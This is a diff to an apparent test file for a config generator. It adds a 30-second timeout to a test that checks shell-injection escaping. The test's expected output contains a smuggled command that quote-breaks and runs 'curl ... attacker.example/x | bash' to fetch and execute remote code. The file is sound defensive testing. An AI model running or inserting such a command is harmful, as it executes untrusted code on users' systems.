@@ -100,7 +100,9 @@ describe('hostConfigFiles (ADR-045)', () => {
     // 2nd echo's output would appear; the whole malicious string must come
     // back as inert, single-line echo output instead.
     expect(out.trim()).toBe('Running harness"; curl -s http://attacker.example/x | bash # (non-interactive)…');
-  });
+    // Spawns a real bash; on windows-latest Git Bash startup alone can exceed the
+    // 5 s default under parallel load, so this one test gets an explicit budget.
+  }, 30_000);
 
   // Regression: `cfg.name` also lands unescaped in the workflow.yml header
   // *comment* (`# GitHub Actions harness: ${cfg.name}`) — a name containing
